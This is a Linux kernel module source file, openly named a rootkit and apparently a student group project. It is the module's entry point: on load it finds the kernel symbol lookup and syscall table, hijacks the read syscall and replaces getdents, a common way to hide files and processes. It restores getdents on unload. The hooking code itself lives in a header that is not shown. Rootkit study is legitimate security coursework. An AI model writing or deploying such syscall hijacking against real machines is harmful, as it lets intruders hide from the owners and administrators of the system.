#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

#include "hooking.h"

static __init int rootkit_init(void) {
    get_kallsyms_funcptr();
    get_syscall_table();
    hijack_read();
    replace_getdents();
    return 0;
}

static __exit void rootkit_exit(void) {
    clear_getdents();
    return;
}


module_init(rootkit_init);
module_exit(rootkit_exit);


MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Guess");
MODULE_AUTHOR("Group 14");
